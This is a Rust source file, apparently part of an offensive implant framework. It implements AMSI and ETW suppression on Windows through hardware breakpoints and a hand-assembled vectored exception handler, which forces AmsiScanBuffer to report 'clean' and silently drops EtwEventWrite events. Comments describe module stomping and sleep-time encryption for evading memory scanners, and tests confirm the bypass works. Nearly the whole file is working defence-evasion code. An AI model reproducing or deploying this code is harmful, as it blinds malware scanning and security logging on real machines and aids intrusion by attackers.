//! AMSI/ETW suppression via hardware breakpoints (ABR-T036): the
//! patch-free successor of ABR-T024. Instead of overwriting the prologue
//! of `amsi.dll!AmsiScanBuffer` and `ntdll!EtwEventWrite` — which leaves
//! the module bytes diverged from disk for every memory scanner to see —
//! this variant sets execution breakpoints (debug registers DR0/DR1) on
//! both functions and swallows the resulting single-step exceptions in a
//! vectored exception handler that retires the call with the "clean"
//! return value, never letting the real code run.
//!
//! - `EtwEventWrite`  → handler sets Rax = 0 (STATUS_SUCCESS) and resumes
//!   at the function's first `ret`: the event is dropped, caller happy.
//! - `AmsiScanBuffer` → Rax = 0 (S_OK), `*AMSI_RESULT` (6th argument, at
//!   `[Rsp+0x30]` on entry — arg5's home slot is +0x28; found live
//!   during ABR-T041 validation which exercised the same retirement for
//!   real) = 0 (`AMSI_RESULT_CLEAN`), resume at `ret`.
//!
//! Zero bytes of any signed module are modified, so hash-based tamper
//! detection (pe-sieve "hooked/replaced") stays quiet. The trade is the
//! artifact that replaces it: debug registers pointing at those two
//! exports, readable by any thread-context query — see
//! docs/detections/abr-t036.md.
//!
//! The handler is hand-assembled on the same kind of external code page
//! the Ekko callbacks use (ABR-T012 stomped DLL when available, private
//! RW otherwise), carries unwind metadata (ABR-T008) for stack walkers,
//! and therefore survives `.text` encryption during sleep: exceptions
//! raised on any thread while the image is encrypted still dispatch into
//! a valid, non-encrypted handler that passes unknown exceptions on.
//!
//! Scope: v1 arms the calling (main) thread only — the single-threaded
//! runtime executes every CLR task (execute-assembly, PowerShell runspace)
//! there. Auxiliary CLR threads are not covered; residual, documented.
#![allow(clippy::missing_transmute_annotations)] // house FFI idiom

use super::{stomp, syscalls, unwind};
use std::sync::OnceLock;

const PAGE_EXECUTE_READ: usize = 0x20;
const PAGE_LEN: usize = 0x1000;
/// Offset of the params block (4 qwords: etw target, amsi target,
/// etw skip-to-ret offset, amsi skip-to-ret offset) inside the code page.
const PARAMS_OFFSET: usize = 0x88;
const UNWIND_META_OFFSET: usize = 0x200;

/// x64 CONTEXT debug-register slots we touch (byte offsets).
const CTX_FLAGS: usize = 0x30;
const CTX_DR0: usize = 0x48;
const CTX_DR1: usize = 0x50;
const CTX_DR7: usize = 0x70;
/// CONTEXT_AMD64 | CONTEXT_DEBUG_REGISTERS.
const CONTEXT_DEBUG_REGISTERS: u64 = 0x0010_0008;
/// DR7 = L0|L1: both breakpoints locally enabled, execute, 1 byte.
const DR7_TWO_EXECUTE: u64 = 0x3;

/// VEH handler, offsets verified by layout assembly (all branches rel32).
///
/// ```text
/// 00: mov rdx,[rcx+8]            ; ContextRecord
/// 04: mov r10,[rdx+0xF8]         ; Rip
/// 0B: lea r11,[rip+params]       ; 0x88
/// 12: cmp [r11],r10              ; Rip == etw target?
/// 15: jne .amsi
/// 1B: add r10,[r11+16]           ; += etw skip-to-ret
/// 1F: mov [rdx+0xF8],r10
/// 26: mov qword [rdx+0x78],0     ; Rax = STATUS_SUCCESS
/// 31: jmp .done
/// 36: .amsi  cmp [r11+8],r10     ; Rip == amsi target?
/// 3A: jne .pass
/// 40: mov qword [rdx+0x78],0     ; Rax = S_OK
/// 4B: mov rax,[rdx+0x98]         ; Rsp
/// 52: test rax,rax / jz .skip
/// 5B: mov rcx,[rax+0x30]         ; 6th arg: AMSI_RESULT* (arg5 home is +0x28)
/// 5F: test rcx,rcx / jz .skip
/// 68: mov dword [rcx],0          ; AMSI_RESULT_CLEAN
/// 6E: .skip  add r10,[r11+24]    ; += amsi skip-to-ret
/// 72: mov [rdx+0xF8],r10
/// 79: .done  mov eax,-1  ; ret   ; EXCEPTION_CONTINUE_EXECUTION
/// 7F: .pass  xor eax,eax ; ret   ; EXCEPTION_CONTINUE_SEARCH (fall-through from .skip lands on .done)
/// 88: params
/// ```
#[rustfmt::skip]
const HANDLER: [u8; PARAMS_OFFSET] = [
    0x48, 0x8B, 0x51, 0x08, 0x4C, 0x8B, 0x92, 0xF8, 0x00, 0x00, 0x00, 0x4C,
    0x8D, 0x1D, 0x76, 0x00, 0x00, 0x00, 0x4D, 0x39, 0x13, 0x0F, 0x85, 0x1B,
    0x00, 0x00, 0x00, 0x4D, 0x03, 0x53, 0x10, 0x4C, 0x89, 0x92, 0xF8, 0x00,
    0x00, 0x00, 0x48, 0xC7, 0x82, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xE9, 0x43, 0x00, 0x00, 0x00, 0x4D, 0x39, 0x53, 0x08, 0x0F, 0x85,
    0x3F, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x82, 0x78, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x8B, 0x82, 0x98, 0x00, 0x00, 0x00, 0x48, 0x85,
    0xC0, 0x0F, 0x84, 0x13, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x48, 0x30, 0x48,
    0x85, 0xC9, 0x0F, 0x84, 0x06, 0x00, 0x00, 0x00, 0xC7, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x4D, 0x03, 0x53, 0x18, 0x4C, 0x89, 0x92, 0xF8, 0x00, 0x00,
    0x00, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3, 0x31, 0xC0, 0xC3, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
];

pub struct Armed {
    /// Resolved target addresses (read by the ignored integration tests).
    #[allow(dead_code)]
    pub etw: usize,
    #[allow(dead_code)]
    pub amsi: usize,
    #[allow(dead_code)]
    page: usize,
    /// SetThreadContext/GetThreadContext readback trace (lab evidence).
    #[allow(dead_code)]
    pub diag: String,
}

static ARMED: OnceLock<Result<Armed, String>> = OnceLock::new();

/// Arms both breakpoints on the calling thread; idempotent. First caller
/// wins and the result (success or the failure reason) is shared. On
/// builds where the hypervisor owns the debug registers (VBS/Credential
/// Guard, Hyper-V enlightenments — measured: Windows 11 26200 with
/// HypervisorPresent, both with VBS running and without) the write
/// reports success but is silently discarded; the readback catches that
/// and the caller falls back to the ABR-T024 byte patch.
pub fn ensure_armed() -> Result<&'static Armed, String> {
    if let Some(set) = ARMED.get() {
        return set.as_ref().map_err(|e| e.clone());
    }
    let built = build().and_then(|armed| armed.arm_breakpoints().map(|()| armed));
    let _ = ARMED.set(built);
    ARMED.get().unwrap().as_ref().map_err(|e| e.clone())
}

fn build() -> Result<Armed, String> {
    let resolve = |module: &str, name: &str| -> Result<usize, String> {
        unsafe { syscalls::export_address(module, name) }
            .ok_or_else(|| format!("{module}!{name} unresolved"))
    };
    // The manual resolver loads amsi.dll on demand (no IAT entry); if a
    // legacy patch already landed there, the first `ret` we scan for is
    // the patch stub's own — which is exactly the resume point we want.
    let etw = resolve("ntdll.dll", "EtwEventWrite")?;
    let amsi = resolve("amsi.dll", "AmsiScanBuffer")?;
    let etw_skip = scan_ret(etw).ok_or("no ret in EtwEventWrite prologue")?;
    let amsi_skip = scan_ret(amsi).ok_or("no ret in AmsiScanBuffer prologue")?;

    // External code page: stomped signed DLL when the carver has one
    // (ABR-T012), private RW otherwise. Like the Ekko callbacks, this
    // must NOT live in the encrypted `.text`.
    let page = match stomp::code_page(PAGE_LEN) {
        Some(stomped) => stomped,
        None => unsafe { syscalls::alloc_rw(PAGE_LEN) }
            .ok_or_else(|| "code page allocation failed".to_string())?,
    };
    for (index, byte) in HANDLER.iter().enumerate() {
        unsafe { std::ptr::write_volatile((page + index) as *mut u8, *byte) };
    }
    let params = [etw as u64, amsi as u64, etw_skip as u64, amsi_skip as u64];
    for (slot, value) in params.iter().enumerate() {
        unsafe { std::ptr::write_volatile((page + PARAMS_OFFSET + slot * 8) as *mut u64, *value) };
    }
    // ABR-T008: leaf routine, no prologue — an empty unwind program is
    // still a valid one, and walkers stop treating the frame as data.
    let _unwind = unsafe {
        unwind::FunctionTable::register(
            page,
            &[unwind::Routine {
                offset: 0,
                len: PARAMS_OFFSET,
                prolog_end: 0,
                prolog: &[],
            }],
            UNWIND_META_OFFSET,
        )
    }?;
    unsafe { syscalls::protect(page, PAGE_LEN, PAGE_EXECUTE_READ) }
        .ok_or_else(|| "code page protect failed".to_string())?;

    // Vectored handler, first in chain.
    let add_veh: unsafe extern "system" fn(u32, usize) -> usize =
        unsafe { std::mem::transmute(resolve("kernel32.dll", "AddVectoredExceptionHandler")?) };
    if unsafe { add_veh(1, page) } == 0 {
        return Err("vectored handler rejected".into());
    }

    Ok(Armed {
        etw,
        amsi,
        page,
        diag: String::new(),
    })
}

impl Armed {
    /// Writes DR0/DR1/DR7 on the calling (main) thread and verifies by
    /// readback. The write is a self-set on the pseudo current-thread
    /// handle followed by a yield: x64 debug-register context is applied
    /// lazily at the next switch-in of the thread, so a brief
    /// `SwitchToThread` forces the application before the readback.
    ///
    /// A suspend/set/resume helper thread was tried first and REJECTED:
    /// suspending the thread that is about to host the CLR leaves the
    /// subsequent `CorBindToRuntimeEx` failing with 0x80004005 (found by
    /// the exec-assembly test during the bench rerun — bisected to the
    /// helper alone, with every other piece gated off). No second thread
    /// exists anymore: the single-thread execution model holds.
    fn arm_breakpoints(&self) -> Result<(), String> {
        let resolve = |module: &str, name: &str| -> Result<usize, String> {
            unsafe { syscalls::export_address(module, name) }
                .ok_or_else(|| format!("{module}!{name} unresolved"))
        };
        #[repr(C, align(16))]
        struct CtxBuf([u8; 0x410]);
        let mut ctx = CtxBuf([0u8; 0x410]);
        let mut put = |off: usize, value: u64| {
            let bytes = value.to_le_bytes();
            ctx.0[off..off + 8].copy_from_slice(&bytes);
        };
        put(CTX_FLAGS, CONTEXT_DEBUG_REGISTERS);
        put(CTX_DR0, self.etw as u64);
        put(CTX_DR1, self.amsi as u64);
        put(CTX_DR7, DR7_TWO_EXECUTE);

        let set_ctx: unsafe extern "system" fn(usize, *const CtxBuf) -> i32 =
            unsafe { std::mem::transmute(resolve("kernel32.dll", "SetThreadContext")?) };
        let get_ctx: unsafe extern "system" fn(usize, *mut CtxBuf) -> i32 =
            unsafe { std::mem::transmute(resolve("kernel32.dll", "GetThreadContext")?) };
        let switch_to_thread: unsafe extern "system" fn() -> i32 =
            unsafe { std::mem::transmute(resolve("kernel32.dll", "SwitchToThread")?) };

        // Current-thread pseudo-handle (-2): no OpenThread, no suspend.
        let self_thread: usize = -2isize as usize;
        if unsafe { set_ctx(self_thread, &ctx) } == 0 {
            return Err("SetThreadContext failed".into());
        }
        // Force the lazy application (a switch-in) before reading back.
        unsafe { switch_to_thread() };
        let mut check = CtxBuf([0u8; 0x410]);
        check.0[CTX_FLAGS..CTX_FLAGS + 8].copy_from_slice(&CONTEXT_DEBUG_REGISTERS.to_le_bytes());
        if unsafe { get_ctx(self_thread, &mut check) } == 0 {
            return Err("GetThreadContext readback failed".into());
        }
        let dr0 = u64::from_le_bytes(check.0[CTX_DR0..CTX_DR0 + 8].try_into().unwrap());
        // Gate: on builds where the hypervisor owns the debug registers
        // the set succeeds but DR0 reads back zero. Treat that as "cannot
        // arm" so the caller falls back to the byte patch (verified on
        // Windows 11 26200, HypervisorPresent, with and without VBS).
        if dr0 != self.etw as u64 {
            return Err("debug registers did not apply (VBS/hypervisor owns them)".into());
        }
        Ok(())
    }
}

/// Offset of the first `ret` (0xC3) within the function's first page.
/// Any byte 0xC3 works as a resume point: jumping straight to it makes
/// the CPU decode `ret` there regardless of the surrounding instruction
/// stream, and the stack is untouched at breakpoint time.
fn scan_ret(addr: usize) -> Option<usize> {
    (0..0x1000usize)
        .find(|&off| unsafe { std::ptr::read_volatile((addr + off) as *const u8) } == 0xC3)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn handler_layout_is_self_consistent() {
        // Entry prologue loads the CONTEXT pointer and Rip.
        assert_eq!(&HANDLER[0x00..0x04], &[0x48, 0x8B, 0x51, 0x08]);
        assert_eq!(HANDLER[0x04], 0x4C);
        // lea r11,[rip+0x76] at 0x0B lands exactly on the params slot.
        let next_rip = 0x0B + 7;
        let disp = i32::from_le_bytes([HANDLER[0x0E], HANDLER[0x0F], HANDLER[0x10], HANDLER[0x11]]);
        assert_eq!(next_rip + disp as usize, PARAMS_OFFSET);
        // The two target compares must be cmp [r11(+8)], r10 — ModRM
        // reg=010 (r10 under REX.R), NOT 011 (r11, comparing against the
        // params ADDRESS). A wrong bit here makes the handler pass every
        // exception through; caught by the synthetic-context test.
        assert_eq!(&HANDLER[0x12..0x15], &[0x4D, 0x39, 0x13]);
        assert_eq!(&HANDLER[0x36..0x3A], &[0x4D, 0x39, 0x53, 0x08]);
        // Both terminal returns present.
        assert_eq!(&HANDLER[0x79..0x7F], &[0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3]); // done: CONTINUE_EXECUTION
        assert_eq!(&HANDLER[0x7F..0x82], &[0x31, 0xC0, 0xC3]); // pass: CONTINUE_SEARCH
    }

    #[test]
    fn scan_ret_finds_a_ret_in_a_real_export() {
        let addr =
            unsafe { syscalls::export_address("kernel32.dll", "Sleep") }.expect("resolve Sleep");
        assert!(scan_ret(addr).is_some(), "every real function has a ret");
    }

    /// Drives the assembled VEH handler directly with a synthetic
    /// EXCEPTION_POINTERS/CONTEXT — the same state the kernel delivers
    /// on a debug-register single-step — without needing the debug
    /// registers themselves. This validates the retirement semantics on
    /// every host, including the VBS ones where DR writes are discarded.
    #[test]
    #[ignore = "registers a real VEH handler; run with --test-threads=1"]
    fn handler_retires_synthetic_contexts() {
        let armed = build().expect("build");
        let params =
            unsafe { std::ptr::read_volatile((armed.page + PARAMS_OFFSET) as *const [u64; 4]) };
        let etw = params[0] as usize;
        let amsi = params[1] as usize;
        let etw_skip = params[2] as usize;
        let amsi_skip = params[3] as usize;
        let handler: unsafe extern "system" fn(usize) -> i32 =
            unsafe { std::mem::transmute(armed.page) };

        #[repr(C, align(16))]
        struct Ctx([u8; 0x410]);
        let put = |c: &mut Ctx, off: usize, value: u64| {
            c.0[off..off + 8].copy_from_slice(&value.to_le_bytes());
        };
        let get = |c: &Ctx, off: usize| -> u64 {
            u64::from_le_bytes(c.0[off..off + 8].try_into().unwrap())
        };
        const RIP: usize = 0xF8;
        const RAX: usize = 0x78;
        const RSP: usize = 0x98;

        // ETW target: retired with Rax = STATUS_SUCCESS, Rip at the ret.
        let mut ctx = Ctx([0u8; 0x410]);
        put(&mut ctx, RIP, etw as u64);
        let mut pointers = [0usize, 0usize];
        pointers[1] = &mut ctx as *mut Ctx as usize;
        let ret = unsafe { handler(pointers.as_ptr() as usize) };
        assert_eq!(ret, -1, "etw target: ContinueExecution");
        assert_eq!(get(&ctx, RAX), 0, "etw target: Rax zeroed");
        assert_eq!(
            get(&ctx, RIP) as usize,
            etw + etw_skip,
            "etw target: Rip at ret"
        );

        // AMSI target: S_OK, AMSI_RESULT (6th arg at [Rsp+0x30]) CLEAN,
        // Rip at the ret.
        let mut result: i32 = 0x7f;
        let mut stack = [0u64; 16];
        stack[6] = &mut result as *mut i32 as usize as u64; // [rsp+0x30] arg6
        let mut ctx = Ctx([0u8; 0x410]);
        put(&mut ctx, RIP, amsi as u64);
        put(&mut ctx, RSP, stack.as_ptr() as u64);
        let mut pointers = [0usize, 0usize];
        pointers[1] = &mut ctx as *mut Ctx as usize;
        let ret = unsafe { handler(pointers.as_ptr() as usize) };
        assert_eq!(ret, -1, "amsi target: ContinueExecution");
        assert_eq!(get(&ctx, RAX), 0, "amsi target: Rax = S_OK");
        assert_eq!(result, 0, "amsi target: AMSI_RESULT_CLEAN");
        assert_eq!(
            get(&ctx, RIP) as usize,
            amsi + amsi_skip,
            "amsi target: Rip at ret"
        );

        // Non-target RIP: pass through with ContinueSearch.
        let mut ctx = Ctx([0u8; 0x410]);
        put(&mut ctx, RIP, 0x0000_4141_4141_4141);
        let mut pointers = [0usize, 0usize];
        pointers[1] = &mut ctx as *mut Ctx as usize;
        let ret = unsafe { handler(pointers.as_ptr() as usize) };
        assert_eq!(ret, 0, "non-target: ContinueSearch");
        assert_eq!(
            get(&ctx, RIP),
            0x0000_4141_4141_4141,
            "non-target: Rip untouched"
        );
    }

    #[test]
    #[ignore = "sets real debug registers; run with --test-threads=1"]
    fn etw_write_is_retired_clean() {
        let armed = match ensure_armed() {
            Ok(armed) => armed,
            Err(e) if e.contains("did not apply") => {
                eprintln!("[i] hwbp blocked by VBS/hypervisor: {e}");
                return;
            }
            Err(e) => panic!("arm: {e}"),
        };
        let write: unsafe extern "system" fn(usize, usize, usize) -> u32 =
            unsafe { std::mem::transmute(armed.etw) };
        // EtwEventWrite(0, null, 0): with the breakpoint live the body
        // never runs — the handler retires it with STATUS_SUCCESS. The
        // real function would fail the (null) registration instead.
        let status = unsafe { write(0, 0, 0) };
        assert_eq!(status, 0, "handler must retire EtwEventWrite with 0");
    }

    #[test]
    #[ignore = "sets real debug registers; run with --test-threads=1"]
    fn amsi_scan_reports_clean() {
        let armed = match ensure_armed() {
            Ok(armed) => armed,
            Err(e) if e.contains("did not apply") => {
                eprintln!("[i] hwbp blocked by VBS/hypervisor: {e}");
                return;
            }
            Err(e) => panic!("arm: {e}"),
        };
        let scan: unsafe extern "system" fn(usize, usize, usize, usize, usize, *mut i32) -> i32 =
            unsafe { std::mem::transmute(armed.amsi) };
        let mut result: i32 = -1;
        let hr = unsafe { scan(0, 0, 0, 0, 0, &mut result) };
        assert_eq!(hr, 0, "AmsiScanBuffer retired with S_OK");
        assert_eq!(result, 0, "AMSI_RESULT must read CLEAN");
    }
}
